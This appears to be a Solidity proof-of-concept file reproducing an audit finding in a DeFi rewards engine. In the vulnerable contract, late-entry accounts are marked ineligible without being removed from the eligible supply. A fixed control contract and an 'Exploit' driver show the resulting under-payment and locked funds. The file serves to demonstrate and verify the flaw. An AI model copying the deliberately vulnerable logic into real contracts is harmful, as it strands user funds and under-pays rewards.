// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Buck Labs (Strong DAO) finding 64665:
// "Eligible supply is not reduced on late entry"  (Spearbit, RewardsEngine.sol
//  #L1257-L1274).
//
// RewardsEngine integrates a global reward denominator, `globalEligibleUnits`,
// as SUM(currentEligibleSupply * elapsed). `currentEligibleSupply` is meant to
// be the sum of balances that are CURRENTLY eligible to earn.
//
// In the late-entry path of `_handleInflow`, an account that makes an inflow
// after the epoch checkpoint is marked ineligible (`s.eligible = false`), but
// its prior eligible balance is NEVER subtracted from `currentEligibleSupply`.
// The global integrator therefore keeps counting that balance for the rest of
// the epoch even though the account no longer accrues per-account units. The
// denominator inflates relative to the true sum of eligible units, so:
//   * genuinely-eligible accounts are UNDER-PAID (diluted), and
//   * the undistributed remainder is stranded (locked) in the contract.
//
// The verbatim vulnerable block is inlined below with a `// @>` marker on the
// exact defective line. `RewardsEngineFixed` is the negative control: it applies
// the auditor's recommended fix (subtract the ineligible balance on late entry).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double. The reward pool is held by the engine and paid to
///      accounts on distribute; a separate marker token records the locked harm.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE RewardsEngine (verbatim late-entry block inlined from the finding).
// ─────────────────────────────────────────────────────────────────────────────
contract RewardsEngine {
    struct Account {
        uint256 balance;
        bool eligible;
        bool excluded;
        uint256 lastAccrualTime;
        uint256 accruedUnits;
    }

    MiniToken public rewardToken;

    mapping(address => Account) internal accounts;
    uint256 public currentEligibleSupply;
    uint256 public globalEligibleUnits;
    uint256 public lastGlobalTime;

    uint256 public checkpointStart;
    uint256 public epochEnd;
    uint256 public now_; // settable clock (test advances it via setNow — no cheatcodes)

    constructor(address token) {
        rewardToken = MiniToken(token);
    }

    // ── benign scaffolding setters ──
    function setEpoch(uint256 cs, uint256 ee) external { checkpointStart = cs; epochEnd = ee; }
    function setNow(uint256 t) external { now_ = t; }
    function fund(uint256 amount) external { rewardToken.mint(address(this), amount); }

    // ── views ──
    function balanceOf(address a) external view returns (uint256) { return accounts[a].balance; }
    function eligibleOf(address a) external view returns (bool) { return accounts[a].eligible; }
    function accruedUnitsOf(address a) external view returns (uint256) { return accounts[a].accruedUnits; }

    /// @notice Benign global settle: advance the integrator to `now_` at the
    ///         current eligible supply. Identical in the fixed variant; standard
    ///         lazy-accrual checkpoint that reward engines expose.
    function checkpoint() public {
        uint256 elapsed = now_ - lastGlobalTime;
        if (elapsed > 0 && currentEligibleSupply > 0) {
            globalEligibleUnits += currentEligibleSupply * elapsed;
        }
        lastGlobalTime = now_;
    }

    /// @notice Token-hook driver entry point: the reward-bearing token notifies
    ///         the engine of an `amount` inflow to `account`.
    function notifyInflow(address account, uint256 amount) external {
        _handleInflow(account, amount);
    }

    function _handleInflow(address account, uint256 amount) internal {
        Account storage s = accounts[account];

        // settle this account's per-account accrual up to now (before eligibility flips)
        uint256 acctElapsed = now_ - s.lastAccrualTime;
        if (s.eligible && acctElapsed > 0) {
            s.accruedUnits += s.balance * acctElapsed;
        }

        // time since the global integrator was last advanced
        uint256 elapsed = now_ - lastGlobalTime;

        // ─── verbatim vulnerable block (RewardsEngine.sol#L1257-L1274) ───
        bool isLateEntry = (checkpointStart > 0 && now_ >= checkpointStart && now_ < epochEnd);
        if (isLateEntry) {
            s.eligible = false; // @> late entry marks the account ineligible but its prior eligible balance is NEVER subtracted from currentEligibleSupply
            s.lastAccrualTime = now_;
        } else {
            if (!s.excluded) {
                s.eligible = true;
                currentEligibleSupply += amount;
            }
        }
        if (elapsed > 0 && currentEligibleSupply > 0) {
            globalEligibleUnits += currentEligibleSupply * elapsed;
        }
        // ─── end verbatim block ───

        lastGlobalTime = now_;
        s.lastAccrualTime = now_;
        s.balance += amount;
    }

    /// @notice Pay each account `accruedUnits * reward / globalEligibleUnits`
    ///         (floor). Because the buggy denominator is inflated, every eligible
    ///         account is under-paid and the remainder stays locked here.
    function distribute(address[] calldata accts, uint256 reward) external returns (uint256 totalPaid) {
        // final global settle up to now
        uint256 elapsed = now_ - lastGlobalTime;
        if (elapsed > 0 && currentEligibleSupply > 0) {
            globalEligibleUnits += currentEligibleSupply * elapsed;
        }
        lastGlobalTime = now_;

        // final per-account settle
        for (uint256 i = 0; i < accts.length; i++) {
            Account storage s = accounts[accts[i]];
            uint256 e = now_ - s.lastAccrualTime;
            if (s.eligible && e > 0) {
                s.accruedUnits += s.balance * e;
            }
            s.lastAccrualTime = now_;
        }

        if (globalEligibleUnits == 0) return 0;

        for (uint256 i = 0; i < accts.length; i++) {
            Account storage s = accounts[accts[i]];
            uint256 pay = s.accruedUnits * reward / globalEligibleUnits;
            if (pay > 0) {
                rewardToken.transfer(accts[i], pay);
                totalPaid += pay;
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED RewardsEngine (negative control): the late-entry branch subtracts the
// account's eligible balance from currentEligibleSupply before flipping the flag,
// keeping the global denominator consistent with the sum of eligible units.
// ─────────────────────────────────────────────────────────────────────────────
contract RewardsEngineFixed {
    struct Account {
        uint256 balance;
        bool eligible;
        bool excluded;
        uint256 lastAccrualTime;
        uint256 accruedUnits;
    }

    MiniToken public rewardToken;

    mapping(address => Account) internal accounts;
    uint256 public currentEligibleSupply;
    uint256 public globalEligibleUnits;
    uint256 public lastGlobalTime;

    uint256 public checkpointStart;
    uint256 public epochEnd;
    uint256 public now_;

    constructor(address token) {
        rewardToken = MiniToken(token);
    }

    function setEpoch(uint256 cs, uint256 ee) external { checkpointStart = cs; epochEnd = ee; }
    function setNow(uint256 t) external { now_ = t; }
    function fund(uint256 amount) external { rewardToken.mint(address(this), amount); }

    function balanceOf(address a) external view returns (uint256) { return accounts[a].balance; }
    function eligibleOf(address a) external view returns (bool) { return accounts[a].eligible; }
    function accruedUnitsOf(address a) external view returns (uint256) { return accounts[a].accruedUnits; }

    function checkpoint() public {
        uint256 elapsed = now_ - lastGlobalTime;
        if (elapsed > 0 && currentEligibleSupply > 0) {
            globalEligibleUnits += currentEligibleSupply * elapsed;
        }
        lastGlobalTime = now_;
    }

    function notifyInflow(address account, uint256 amount) external {
        _handleInflow(account, amount);
    }

    function _handleInflow(address account, uint256 amount) internal {
        Account storage s = accounts[account];

        uint256 acctElapsed = now_ - s.lastAccrualTime;
        if (s.eligible && acctElapsed > 0) {
            s.accruedUnits += s.balance * acctElapsed;
        }

        uint256 elapsed = now_ - lastGlobalTime;

        bool isLateEntry = (checkpointStart > 0 && now_ >= checkpointStart && now_ < epochEnd);
        if (isLateEntry) {
            currentEligibleSupply -= s.balance; // FIX: remove the now-ineligible balance from the eligible supply
            s.eligible = false;
            s.lastAccrualTime = now_;
        } else {
            if (!s.excluded) {
                s.eligible = true;
                currentEligibleSupply += amount;
            }
        }
        if (elapsed > 0 && currentEligibleSupply > 0) {
            globalEligibleUnits += currentEligibleSupply * elapsed;
        }

        lastGlobalTime = now_;
        s.lastAccrualTime = now_;
        s.balance += amount;
    }

    function distribute(address[] calldata accts, uint256 reward) external returns (uint256 totalPaid) {
        uint256 elapsed = now_ - lastGlobalTime;
        if (elapsed > 0 && currentEligibleSupply > 0) {
            globalEligibleUnits += currentEligibleSupply * elapsed;
        }
        lastGlobalTime = now_;

        for (uint256 i = 0; i < accts.length; i++) {
            Account storage s = accounts[accts[i]];
            uint256 e = now_ - s.lastAccrualTime;
            if (s.eligible && e > 0) {
                s.accruedUnits += s.balance * e;
            }
            s.lastAccrualTime = now_;
        }

        if (globalEligibleUnits == 0) return 0;

        for (uint256 i = 0; i < accts.length; i++) {
            Account storage s = accounts[accts[i]];
            uint256 pay = s.accruedUnits * reward / globalEligibleUnits;
            if (pay > 0) {
                rewardToken.transfer(accts[i], pay);
                totalPaid += pay;
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver.
//
// Timeline (times advanced via setNow — no cheatcodes):
//   t=0     A and C each enter with 100 tokens (pre-epoch, non-late) → eligible,
//           currentEligibleSupply = 200.
//   t=100   (= checkpointStart) the integrator is settled for [0,100] at supply 200,
//           then A makes a LATE inflow → A disqualified. Buggy engine leaves A's
//           100 in currentEligibleSupply; fixed engine subtracts it (→ 100).
//   t=1100  (= epochEnd) distribute the reward pool.
//
// Only C legitimately earns over [100,1100]; A earned only during [0,100].
// Buggy denominator = 220000·1e18 (A's stale 100 counted for [100,1100]);
// fixed denominator = 120000·1e18 = exact sum of eligible units.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ACCOUNT_A = 0x000000000000000000000000000000000000aaaa;
    address internal constant ACCOUNT_C = 0x000000000000000000000000000000000000CcCc;

    uint256 internal constant A_BAL = 100 ether;
    uint256 internal constant C_BAL = 100 ether;
    uint256 internal constant LATE_AMT = 100 ether;
    uint256 internal constant REWARD = 1_320_000 ether;
    uint256 internal constant CP_START = 100;
    uint256 internal constant EPOCH_END = 1100;

    MiniToken public rewardBuggy;
    MiniToken public rewardFixed;
    RewardsEngine public engine;
    RewardsEngineFixed public engineFixed;
    MiniToken public marker;

    // exposed results
    uint256 public buggyPaidC;
    uint256 public buggyPaidA;
    uint256 public buggyStranded;
    uint256 public fixedPaidC;
    uint256 public fixedPaidA;
    uint256 public fixedStranded;
    uint256 public underPaidC; // fixedPaidC - buggyPaidC
    uint256 public sinkMarkerBalance;

    address public engineAddr;
    address public markerAddr;

    constructor() {
        // deterministic deploy order (marker LAST)
        rewardBuggy = new MiniToken("RewardB", "rB");                 // 0
        rewardFixed = new MiniToken("RewardF", "rF");                 // 1
        engine = new RewardsEngine(address(rewardBuggy));             // 2
        engineFixed = new RewardsEngineFixed(address(rewardFixed));   // 3
        marker = new MiniToken("LOCKED-REWARD", "LOCKED-REWARD");     // 4 (LAST)
        engineAddr = address(engine);
        markerAddr = address(marker);
    }

    function _runBuggy() internal returns (uint256 paidC, uint256 paidA, uint256 stranded) {
        engine.setEpoch(CP_START, EPOCH_END);
        engine.fund(REWARD);

        engine.setNow(0);
        engine.notifyInflow(ACCOUNT_A, A_BAL);
        engine.notifyInflow(ACCOUNT_C, C_BAL);

        engine.setNow(CP_START);
        engine.checkpoint(); // settle [0,100] at supply = A + C
        engine.notifyInflow(ACCOUNT_A, LATE_AMT); // late → A disqualified; buggy keeps A in supply

        engine.setNow(EPOCH_END);
        address[] memory accts = new address[](2);
        accts[0] = ACCOUNT_A;
        accts[1] = ACCOUNT_C;
        engine.distribute(accts, REWARD);

        paidC = rewardBuggy.balanceOf(ACCOUNT_C);
        paidA = rewardBuggy.balanceOf(ACCOUNT_A);
        stranded = rewardBuggy.balanceOf(address(engine)); // undistributed remainder locked in the engine
    }

    function _runFixed() internal returns (uint256 paidC, uint256 paidA, uint256 stranded) {
        engineFixed.setEpoch(CP_START, EPOCH_END);
        engineFixed.fund(REWARD);

        engineFixed.setNow(0);
        engineFixed.notifyInflow(ACCOUNT_A, A_BAL);
        engineFixed.notifyInflow(ACCOUNT_C, C_BAL);

        engineFixed.setNow(CP_START);
        engineFixed.checkpoint();
        engineFixed.notifyInflow(ACCOUNT_A, LATE_AMT); // late → A disqualified; fixed removes A from supply

        engineFixed.setNow(EPOCH_END);
        address[] memory accts = new address[](2);
        accts[0] = ACCOUNT_A;
        accts[1] = ACCOUNT_C;
        engineFixed.distribute(accts, REWARD);

        paidC = rewardFixed.balanceOf(ACCOUNT_C);
        paidA = rewardFixed.balanceOf(ACCOUNT_A);
        stranded = rewardFixed.balanceOf(address(engineFixed));
    }

    function run() external payable {
        (buggyPaidC, buggyPaidA, buggyStranded) = _runBuggy();
        (fixedPaidC, fixedPaidA, fixedStranded) = _runFixed();

        underPaidC = fixedPaidC - buggyPaidC;

        // HARM: the undistributed remainder is locked in the buggy engine; record it at the SINK.
        marker.mint(SINK, buggyStranded);
        sinkMarkerBalance = marker.balanceOf(SINK);

        require(buggyPaidC < fixedPaidC, "C not under-paid");
        require(buggyStranded > 0 && fixedStranded == 0, "no stranded remainder");
        require(sinkMarkerBalance == buggyStranded, "marker mismatch");
    }
}
